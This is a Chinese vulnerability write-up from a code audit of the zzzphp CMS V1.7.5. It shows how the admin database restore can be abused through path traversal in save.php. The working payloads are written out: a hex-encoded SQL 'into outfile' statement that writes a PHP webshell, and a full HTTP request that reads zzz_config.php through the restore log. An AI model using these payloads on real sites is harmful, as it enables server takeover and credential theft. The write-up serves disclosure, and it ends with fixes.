zzzphp是一款php语言开发的免费建站系统以简单易上手的标签、安全的系统内核、良好的用户体验为特点是站长建站的最佳选择。目前zzzphp最新版为V1.7.5正式版在做代码审计的时候发现全版本后台数据库还原限制不严格导致多种安全问题可以造成执行任意SQL语句任意文件读取、上传webshell等。

首先进入后台数据库备份页在之前旧版本中可以直接编辑备份数据库的内容

![image.png](https://image.3001.net/images/20200611/1591863595_5ee1e92bd93e7.png!small)

抓包发现调用处为save.php的act为editfile这里提交的POST数据内容为

    
    
    file=%2Fzzzphp%2Fadmin768%2Fbackup%2F1591758681.bak&filetext=select+111+into+outfile+%27c%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Czzzphp%5C%5Ca.php%27%EF%BC%9B

在代码里跟踪editfile函数代码可以发现

    
    
    function editfile(){
        $file=getform('file','post');
        $filetext=getform('filetext','post');
        $file_path=file_path($file);
        $safe_path=array('upload','template','runtime');
        if(arr_search($file_path,$safe_path)){
          $file=$_SERVER['DOCUMENT_ROOT'].$file;
           !(is_file($file)) and layererr('保存失败文件不存在');
        }else{
            layererr('非安全目录文件不允许修改');
        }   
        if (create_file($file,$filetext)){
            layertrue ('修改成功');
        }else{
            layererr('保存失败');
        };
    }

通过一些判断后进入create_file函数

    
    
    function create_file( $path, $zcontent = NULL, $over = true ) {
        $path =  str_replace( '//', '/', $path );
        check_dir( dirname( $path ), true );
        $ext=file_ext( $path );
        if(in_array($ext,array('php','asp','aspx','exe','sh','sql','bat')) ||  empty($ext))  error( '创建文件失败,禁止创建'.$ext.'文件,' . $path );
        $handle = fopen( $path, 'w' )or error( '创建文件失败,请检查目录权限' );
        fwrite( $handle, $zcontent );
        return fclose( $handle );
    }

发现这里其实做了三个限制

1、文件需要存在

    
    
    if(in_array($ext,array('php','asp','aspx','exe','sh','sql','bat')) ||  empty($ext)) 

2、如果文件后缀为php、asp、aspx这种关键会受限制但是黑名单还是可以进行绕过比如没有禁止cerdexphp3,phtml这种特殊后缀。

    
    
    if(in_array($ext,array('php','asp','aspx','exe','sh','sql','bat')) ||  empty($ext)) 

3、路径需要满足upload、template或者runtime

    
    
    $safe_path=array('upload','template','runtime');

首先因为是备份文件文件必须是存在的所以轻松绕过限制1由于是bak文件的后缀也不受后缀影响可以绕过限制2但是限制3需要路径需要满足upload、template或者runtime因为是在后台目录下所以不符合因为是array匹配尝试构造../相对路径

    
    
    file=%2Fzzzphp%2Fupload%2F..%2Fadmin768%2Fbackup%2F1591758681.bak

![image.png](https://image.3001.net/images/20200611/1591863765_5ee1e9d5b84cd.png!small)

这样可以成功绕过限制可以达到对数据库备份文件的修改如下图所示

![image.png](https://image.3001.net/images/20200611/1591863776_5ee1e9e0a6515.png!small)

这里有个小问题Filetext内容会经过txt_html检查在\inc\zzz_main.php第817行

``

    
    
    function txt_html( $s ) {    
    
    	if ( !$s ) return $s;
    
    	if ( is_array( $s ) ) { // 数组处理
    
    		foreach ( $s as $key => $value ) {
    
    			$string[ $key ] = txt_html( $value );
    
    		}
    
    	} else {
    
            if (get_magic_quotes_gpc())  $s = addslashes( $s );        
    
    		$s = trim( $s );
    
    		//array("'"=>"&ampapos",'"'=>"&ampquot",'<'=> "&amplt",'>'=> "&ampgt");     
    
            if ( DB_TYPE == 'access' ) {
    
    			//$s= toutf( $s );
    
    			$s = str_replace( "'", "&ampapos", $s );
    
    			$s = str_replace( '"', "&ampquot", $s );
    
    			$s = str_replace( "<", "&amplt", $s );
    
    			$s = str_replace( ">", "&ampgt", $s );
    
    		}else{
    
    			$s = htmlspecialchars( $s,ENT_QUOTES,'UTF-8' );       
    
    		} 				
    
    		$s = str_replace( "\t", ' &ampnbsp &ampnbsp &ampnbsp &ampnbsp', $s );		
    
    		$s = preg_replace('/script/i', 'scr1pt', $s );
    
    		$s = preg_replace('/document/i', 'd0cument', $s );		
    
    		$s = preg_replace('/.php/i', 'php', $s );
    
            $s = preg_replace('/ascii/i', 'asc11', $s );
    
    		$s = preg_replace('/eval/i' , 'eva1', $s );
    
    		$s = str_replace( array("base64_decode", "assert", ""), "", $s );
    
    		$s = str_replace( array("\r\n","\n"), "<br/>", $s );
    
    	}
    
    	return $s;
    
    }

``

如果直接写入内容如

    
    
    select 111 into outfile'c:\\xampp\\htdocs\\zzzphp\\a.php'

单引号会被转换所以将以上内容转换成16进制也不能有\r\n写成一行

    
    
    set @a=0x73656c6563742031313120696e746f206f757466696c652027633a5c5c78616d70705c5c6874646f63735c5c7a7a7a7068705c5c612e70687027;preparecmd from @a;execute cmd;

可以看到能成功修改

![image.png](https://image.3001.net/images/20200611/1591863969_5ee1eaa1ee7ac.png!small)

然后我们再看看恢复数据库的操作。

    
    
    function restore(){

![image.png](https://image.3001.net/images/20200611/1591863984_5ee1eab08dece.png!small)

是的并没有做任何检查直接可以按句恢复这样导致执行备份webshell的SQL语句执行并在网站目录下生成a.php。

在最新版本笔者下的是V1.7.5正式版中编辑数据库bak文件显示此文件不允许编辑因为在编辑模板template\templateedit.tpl处做了safe_ext限制只允许读取xml、html、css、js文件后缀。

**![image.png](https://image.3001.net/images/20200611/1591864482_5ee1eca25f12f.png!small)**

那么如何绕过限制呢既然不让编辑原有的数据库那么自行上传一个数据库bak文件试试在后台上传设置里增加bak后缀看来是没有限制的。

**![image.png](https://image.3001.net/images/20200611/1591864493_5ee1ecadcad87.png!small)**

在附件上传中上传bak文件也可以看到能正常上传成功

![](https://image.3001.net/images/20200706/1594022789.png!small)

然后数据库恢复的时候将path修改成上传的bak文件

**![image.png](https://image.3001.net/images/20200611/1591864508_5ee1ecbccfd80.png!small)**并跟踪程序发现一路畅通直接进入数据库备份恢复可以看到SQL语句成功进入执行体db_exec()执行

**![image.png](https://image.3001.net/images/20200611/1591864520_5ee1ecc81068a.png!small)![image.png](https://image.3001.net/images/20200611/1591864523_5ee1eccbc3c25.png!small)**

在数据库执行体中继续往下看:

    
    
    function db_exec( $sql, $d = NULL ,$log=true) {
        $db = $_SERVER[ 'db' ];
        $d = $d ? $d : $db;
        if ( !$d ) return FALSE;
        $sql = str_replace( '[dbpre]', DB_PRE, $sql );
        $n = $d->exec( $sql );
        db_errno_errstr( $n, $d,$sql);
        str_log( $sql."\t" , 'log' );
        return $n;
    }

在执行exec完SQL会进入记录日志函数

    
    
    str_log( $sql."\t" , 'log' );

跟踪str_logh函数发现在zzz.file.php中613行跟进到str_log文件看到文件的命名规则为文件命名规则为当天时间的时间戳+数据库用户+数据库密码并且是未授权访问

**![image.png](https://image.3001.net/images/20200611/1591864749_5ee1edadb288a.png!small)**从后台-操作记录中也可以访问

**![image.png](https://image.3001.net/images/20200611/1591864778_5ee1edcab2bc7.png!small)**

突然想到如果将path修改为系统限制文件比如配置文件config/zzz_config.php内容将会被转化成sql语句并记录日志然后读取到修改报文如下。

zzz_config.php配置内容文件果然可以被成功读取到。

    
    
    POST http://127.0.0.1/zzzphp/11111111111/save.php?act=restore HTTP/1.1
    
    Host:127.0.0.1
    
    Connection:keep-alive
    
    Content-Length:41
    
    Accept:*/*
    
    X-Requested-With:XMLHttpRequest
    
    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/83.0.4103.97 Safari/537.36
    
    Content-Type:application/x-www-form-urlencoded; charset=UTF-8
    
    Origin:http://127.0.0.1
    
    Sec-Fetch-Site:same-origin
    
    Sec-Fetch-Mode:cors
    
    Sec-Fetch-Dest:empty
    
    Referer:http://127.0.0.1/zzzphp/11111111111/?datebackuplist
    
    Accept-Encoding:gzip, deflate, br
    
    Accept-Language:zh-CN,zh;q=0.9
    
    Cookie:zzz013_adminpass=1; zzz013_adminpath=0; zzz013_adminname=admin;zzz013_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz013_admintime=1591790181;XDEBUG_SESSION=PHPSTORM; PHPSESSID=mtg1vpfnapf6abr6sikv1b0lb1
    
    path=%2Fzzzphp%2Fconfig%2Fzzz_config.php

![image.png](https://image.3001.net/images/20200611/1591864802_5ee1ede2adf87.png!small)

## **漏洞修复**

> 1、建议增加对path路径的限制
>
> 2、建议对数据库恢复内容进行过滤

笔者已经将漏洞提交给国家漏洞中心，并关注到官方20200701 zzzphp V1.8.0正式版对该问题已做了修复。

